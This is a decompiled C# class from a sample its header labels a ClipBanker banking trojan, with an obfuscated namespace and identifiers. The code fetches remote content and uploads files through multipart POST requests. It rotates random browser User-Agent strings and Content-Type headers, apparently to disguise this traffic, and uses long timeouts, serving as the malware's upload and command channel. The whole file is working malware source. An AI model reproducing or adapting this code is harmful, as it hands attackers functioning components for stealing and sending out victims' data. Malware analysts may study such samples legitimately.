// Decompiled with JetBrains decompiler
// Type: 86V.82l
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u003544;
using \u00386V;
using crD;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace \u00386V
{
  internal static class \u00382l
  {
    public static string k16 = \u00382l.L9I();
    public static string nTx = \u00382l.\u0033pn();

    public static string rjO(string _param0, bool _param1 = true)
    {
      try
      {
        if (_param1)
        {
          using (WebClient webClient = new WebClient())
          {
            webClient.Headers["Content-Type"] = \u00382l.nTx;
            webClient.Headers["Accept"] = "*/*";
            webClient.Headers["User-Agent"] = \u00382l.k16;
            return webClient.DownloadString(_param0);
          }
        }
        else
        {
          using (WebClient webClient = new WebClient())
          {
            webClient.Headers["User-Agent"] = \u00382l.k16;
            return webClient.DownloadString(_param0);
          }
        }
      }
      catch
      {
        return (string) null;
      }
    }

    public static string \u0037I5([In] int obj0)
    {
      string str = string.Empty;
      for (int index = 0; index < obj0; ++index)
        str = str + xY7.\u003842(new \u003192().Z87(2, 32)) + "=" + xY7.\u003842(new \u003192().Z87(2, 32)) + "&";
      return str.Remove(str.Length - 1);
    }

    public static string \u0036a5([In] string obj0) => new Uri(obj0).Host;

    public static string L9I()
    {
      string[] strArray = new string[12]
      {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.34",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.53",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.60",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
      };
      return strArray[new \u003192().y4D(strArray.Length)];
    }

    public static string \u0033pn()
    {
      string[] strArray = new string[6]
      {
        "text/css",
        "text/csv",
        "text/html",
        "text/javascript",
        "application/json",
        "text/plain"
      };
      return strArray[new \u003192().y4D(strArray.Length)];
    }

    public static HttpWebResponse \u0035cJ(
      [In] string obj0,
      [In] string obj1,
      [In] Dictionary<string, object> obj2)
    {
      string str1 = string.Format("----------{0:N}", (object) Guid.NewGuid());
      string str2 = "multipart/form-data; boundary=" + str1;
      byte[] numArray = \u00382l.qi7(obj2, str1);
      return \u00382l.qJW(obj0, obj1, str2, numArray);
    }

    private static HttpWebResponse qJW(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] byte[] obj3)
    {
      HttpWebRequest httpWebRequest = WebRequest.Create(obj0) as HttpWebRequest;
      httpWebRequest.Method = "POST";
      httpWebRequest.ContentType = obj2;
      httpWebRequest.UserAgent = obj1;
      httpWebRequest.CookieContainer = new CookieContainer();
      httpWebRequest.Timeout = 900000;
      httpWebRequest.ReadWriteTimeout = 900000;
      httpWebRequest.ContentLength = (long) obj3.Length;
      using (Stream requestStream = httpWebRequest.GetRequestStream())
      {
        requestStream.Write(obj3, 0, obj3.Length);
        requestStream.Close();
      }
      return httpWebRequest.GetResponse() as HttpWebResponse;
    }

    private static byte[] qi7([In] Dictionary<string, object> obj0, [In] string obj1)
    {
      Stream stream = (Stream) new MemoryStream();
      bool flag = false;
      foreach (KeyValuePair<string, object> keyValuePair in obj0)
      {
        if (flag)
          stream.Write(Encoding.UTF8.GetBytes("\r\n"), 0, Encoding.UTF8.GetByteCount("\r\n"));
        flag = true;
        if (keyValuePair.Value is \u00382l.U85)
        {
          \u00382l.U85 u85 = keyValuePair.Value as \u00382l.U85;
          string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\";\r\nContent-Type: {3}\r\n\r\n", (object) obj1, (object) keyValuePair.Key, (object) (u85.\u0037M1() ?? keyValuePair.Key), (object) (u85.E5S() ?? "application/octet-stream"));
          stream.Write(Encoding.UTF8.GetBytes(s), 0, Encoding.UTF8.GetByteCount(s));
          stream.Write(u85.\u0031Tb(), 0, u85.\u0031Tb().Length);
        }
        else
        {
          string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}", (object) obj1, (object) keyValuePair.Key, keyValuePair.Value);
          stream.Write(Encoding.UTF8.GetBytes(s), 0, Encoding.UTF8.GetByteCount(s));
        }
      }
      string s1 = "\r\n--" + obj1 + "--\r\n";
      stream.Write(Encoding.UTF8.GetBytes(s1), 0, Encoding.UTF8.GetByteCount(s1));
      stream.Position = 0L;
      byte[] buffer = new byte[stream.Length];
      stream.Read(buffer, 0, buffer.Length);
      stream.Close();
      return buffer;
    }

    public sealed class U85
    {
      private byte[] \u0032Yv;
      private string z43;
      private string k53;

      [SpecialName]
      public byte[] \u0031Tb() => this.\u0032Yv;

      [SpecialName]
      public void \u0034HT([In] byte[] obj0) => this.\u0032Yv = obj0;

      [SpecialName]
      public string \u0037M1() => this.z43;

      [SpecialName]
      public void m34([In] string obj0) => this.z43 = obj0;

      [SpecialName]
      public string E5S() => this.k53;

      [SpecialName]
      public void \u00313u([In] string obj0) => this.k53 = obj0;

      public U85([In] byte[] obj0, [In] string obj1, [In] string obj2)
      {
        this.\u0034HT(obj0);
        this.m34(obj1);
        this.\u00313u(obj2);
      }
    }
  }
}
